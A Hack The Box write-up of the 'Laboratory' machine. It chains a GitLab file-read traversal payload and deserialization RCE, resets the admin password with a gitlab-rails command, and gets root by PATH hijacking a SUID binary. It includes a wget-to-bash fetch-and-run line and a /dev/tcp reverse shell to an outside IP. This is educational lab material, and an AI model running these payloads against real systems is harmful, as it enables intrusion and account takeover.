Laboratory Write-Up

Apr 16, 2021

This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.

Webapplication Enumeration

Port 80 redirects to laboratory.htb so lets add that to our /etc/hosts file. Firefox present a certificate error indicating that the certificate is only valid for git.laboratory.htb, so lets add it to our /etc/hosts file.

I can create an account on git.laboratory.htb by using an @laboratory.htb email address. Once logged in I determine the version of GitLab by going to git.laboratory.htb/help.

Googling GitLab 12.8.1 I can find an interesting vulnerability. It is an arbitrary file read vulnerabilty (gitlab issue) that can be levereged to get RCE through a deserialization attack.

As a learning exercise I decided to perform the LFI manually.

Gitlab Arbitrary File Read

To do this manually I login into git.laboratory.htb and perform the following steps:

  1. Create a new project named p1
  2. Create a new project named p2
  3. Create in p1 a new issue with the description: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
  4. Move the issue from p1 to p2 (Button in lower right corner)
  5. Visit the issue in p2 to download the secrets.yml file

From the secrets.yml file I extract the secret_key_base key

Gitlab RCE

I then use the resulting shell to spawn another reverseshell that I can upgrade using some python magic.

GitLab Container Enumeration

In the reverse shell I run Linpeas.sh (without touching disk): wget http://10.10.15.46:8000/linpeas.sh -O - | /bin/bash.

From the output I discover that I am currently inside a docker container. Linpeas also dumps user credentials of the GitLab application. From the linpeas.sh script I extract the following command to change the password of the root user:

gitlab-rails runner 'user = User.find_by(email: "admin@example.com"); user.password = "pass_peass_pass"; user.password_confirmation = "pass_peass_pass"; user.save!'

User Shell

Next, I log in using the admin@example.com:pass_peass_pass credentials. As admin I can now see 2 more projects. Inside the secure docker project I find a SSH private key. Gitlab also shows that the username of the admin account is dexter.

Next, I log into the machine via SSH using the username dexter and the found SSH key:

ssh dexter@laboratory.htb -i id_rsa_dexter

Local Enumeration

And then start enumerating again using linpeas.sh, in the output was one interesting SUID file that I did not recognize: /usr/local/bin/docker-security. Googling the file I could not find anything about it, also running the file gave no output. Next I tried running it with the -v and -h flags hoping it would give some output that would reveal what the file did. However, no success here.

Privilege Escalation

Next I tried ltracing to file to figure out what it does. The ltrace output shows that the binary calls the chmod program, without specifying the full path. This is a security risk, as the binary runs as root.

sudo ltrace /usr/local/bin/docker-security             
setuid(0) 
setgid(0) 
system("chmod 700 /usr/bin/docker" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) 
system("chmod 660 /var/run/docker.sock" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) 
+++ exited (status 0) +++

I know the use of relative paths can be levereged to get code execution, whowever it has been a while since I last did this. So I used this blogpost as a reference and get code execution by creating a fake chmod file containing a reverse shell and then adding it to my path.

dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
dexter@laboratory:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin
dexter@laboratory:/tmp$ chmod +x ./chmod 
dexter@laboratory:/tmp$ docker-security

Abusing the docker-security binary that uses relative paths.

#!/bin/bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.46/4243 0>&1"
